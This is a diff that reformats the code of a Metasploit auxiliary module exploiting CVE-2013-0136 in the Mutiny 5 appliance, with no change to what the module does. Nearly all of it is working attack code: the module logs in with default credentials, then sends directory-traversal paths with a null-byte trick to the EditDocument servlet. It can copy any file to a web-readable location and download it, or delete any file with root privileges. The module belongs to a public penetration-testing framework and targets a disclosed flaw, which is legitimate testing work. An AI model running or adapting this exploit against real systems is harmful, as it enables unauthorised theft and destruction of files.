@@ -7,44 +7,46 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'        => 'Mutiny 5 Arbitrary File Read and Delete',
-      'Description' => %q{
+    super(
+      update_info(
+        info,
+        'Name' => 'Mutiny 5 Arbitrary File Read and Delete',
+        'Description' => %q{
           This module exploits the EditDocument servlet from the frontend on the Mutiny 5
-        appliance. The EditDocument servlet provides file operations, such as copy and
-        delete, which are affected by a directory traversal vulnerability. Because of this,
-        any authenticated frontend user can read and delete arbitrary files from the system
-        with root privileges. In order to exploit the vulnerability a valid user (any role)
-        in the web frontend is required. The module has been tested successfully on the
-        Mutiny 5.0-1.07 appliance.
-      },
-      'Author'       =>
-        [
+          appliance. The EditDocument servlet provides file operations, such as copy and
+          delete, which are affected by a directory traversal vulnerability. Because of this,
+          any authenticated frontend user can read and delete arbitrary files from the system
+          with root privileges. In order to exploit the vulnerability a valid user (any role)
+          in the web frontend is required. The module has been tested successfully on the
+          Mutiny 5.0-1.07 appliance.
+        },
+        'Author' => [
           'juan vazquez' # Metasploit module and initial discovery
         ],
-      'License'     => MSF_LICENSE,
-      'References'  =>
-        [
+        'License' => MSF_LICENSE,
+        'References' => [
           [ 'CVE', '2013-0136' ],
           [ 'US-CERT-VU', '701572' ],
           [ 'URL', 'https://blog.rapid7.com/2013/05/15/new-1day-exploits-mutiny-vulnerabilities' ]
         ],
-      'Actions'     =>
-        [
+        'Actions' => [
           ['Read', 'Description' => 'Read arbitrary file'],
           ['Delete', 'Description' => 'Delete arbitrary file']
         ],
-      'DefaultAction' => 'Read',
-      'DisclosureDate' => '2013-05-15'))
+        'DefaultAction' => 'Read',
+        'DisclosureDate' => '2013-05-15'
+      )
+    )
 
     register_options(
       [
         Opt::RPORT(80),
-        OptString.new('TARGETURI',[true, 'Path to Mutiny Web Service', '/']),
+        OptString.new('TARGETURI', [true, 'Path to Mutiny Web Service', '/']),
         OptString.new('USERNAME', [ true, 'The user to authenticate as', 'superadmin@mutiny.com' ]),
         OptString.new('PASSWORD', [ true, 'The password to authenticate with', 'password' ]),
-        OptString.new('PATH',     [ true, 'The file to read or delete' ]),
-      ])
+        OptString.new('PATH', [ true, 'The file to read or delete' ]),
+      ]
+    )
   end
 
   def run
@@ -57,30 +59,30 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     case action.name
-      when 'Read'
-        read_file(datastore['PATH'])
-      when 'Delete'
-        delete_file(datastore['PATH'])
+    when 'Read'
+      read_file(datastore['PATH'])
+    when 'Delete'
+      delete_file(datastore['PATH'])
     end
   end
 
   def read_file(file)
-
     print_status("Copying file to Web location...")
 
     dst_path = "/usr/jakarta/tomcat/webapps/ROOT/m/"
     res = send_request_cgi(
-    {
-      'uri'           => normalize_uri(target_uri.path, "interface", "EditDocument"),
-      'method'        => 'POST',
-      'cookie'        => "JSESSIONID=#{@session}",
-      'encode_params' => false,
-      'vars_post'     => {
-        'operation' => 'COPY',
-        'paths[]' => "../../../../#{file}%00.txt",
-        'newPath' => "../../../..#{dst_path}"
+      {
+        'uri' => normalize_uri(target_uri.path, "interface", "EditDocument"),
+        'method' => 'POST',
+        'cookie' => "JSESSIONID=#{@session}",
+        'encode_params' => false,
+        'vars_post' => {
+          'operation' => 'COPY',
+          'paths[]' => "../../../../#{file}%00.txt",
+          'newPath' => "../../../..#{dst_path}"
+        }
       }
-    })
+    )
 
     if res and res.code == 200 and res.body =~ /\{"success":true\}/
       print_good("File #{file} copied to #{dst_path} successfully")
@@ -92,9 +94,10 @@ class MetasploitModule < Msf::Auxiliary
 
     res = send_request_cgi(
       {
-        'uri'       => normalize_uri(target_uri.path, "m", ::File.basename(file)),
-        'method'    => 'GET'
-      })
+        'uri' => normalize_uri(target_uri.path, "m", ::File.basename(file)),
+        'method' => 'GET'
+      }
+    )
 
     if res and res.code == 200
       store_path = store_loot("mutiny.frontend.data", "application/octet-stream", rhost, res.body, file)
@@ -111,15 +114,16 @@ class MetasploitModule < Msf::Auxiliary
     print_status("Deleting file #{file}")
 
     res = send_request_cgi(
-    {
-      'uri'       => normalize_uri(target_uri.path, "interface", "EditDocument"),
-      'method'    => 'POST',
-      'cookie'    => "JSESSIONID=#{@session}",
-      'vars_post' => {
-        'operation' => 'DELETE',
-        'paths[]' => "../../../../#{file}"
+      {
+        'uri' => normalize_uri(target_uri.path, "interface", "EditDocument"),
+        'method' => 'POST',
+        'cookie' => "JSESSIONID=#{@session}",
+        'vars_post' => {
+          'operation' => 'DELETE',
+          'paths[]' => "../../../../#{file}"
+        }
       }
-    })
+    )
 
     if res and res.code == 200 and res.body =~ /\{"success":true\}/
       print_good("File #{file} deleted")
@@ -129,38 +133,40 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def login
-
     res = send_request_cgi(
       {
-        'uri'    => normalize_uri(target_uri.path, "interface", "index.do"),
+        'uri' => normalize_uri(target_uri.path, "interface", "index.do"),
         'method' => 'GET'
-      })
+      }
+    )
 
     if res and res.code == 200 and res.get_cookies =~ /JSESSIONID=(.*);/
       first_session = $1
     end
 
     res = send_request_cgi(
-    {
-      'uri'       => normalize_uri(target_uri.path, "interface", "j_security_check"),
-      'method'    => 'POST',
-      'cookie'    => "JSESSIONID=#{first_session}",
-      'vars_post' => {
-        'j_username' => datastore['USERNAME'],
-        'j_password' => datastore['PASSWORD']
+      {
+        'uri' => normalize_uri(target_uri.path, "interface", "j_security_check"),
+        'method' => 'POST',
+        'cookie' => "JSESSIONID=#{first_session}",
+        'vars_post' => {
+          'j_username' => datastore['USERNAME'],
+          'j_password' => datastore['PASSWORD']
+        }
       }
-    })
+    )
 
     if not res or res.code != 302 or res.headers['Location'] !~ /interface\/index.do/
       return false
     end
 
     res = send_request_cgi(
-    {
-      'uri'    => normalize_uri(target_uri.path, "interface", "index.do"),
-      'method' => 'GET',
-      'cookie' => "JSESSIONID=#{first_session}"
-    })
+      {
+        'uri' => normalize_uri(target_uri.path, "interface", "index.do"),
+        'method' => 'GET',
+        'cookie' => "JSESSIONID=#{first_session}"
+      }
+    )
 
     if res and res.code == 200 and res.get_cookies =~ /JSESSIONID=(.*);/
       @session = $1
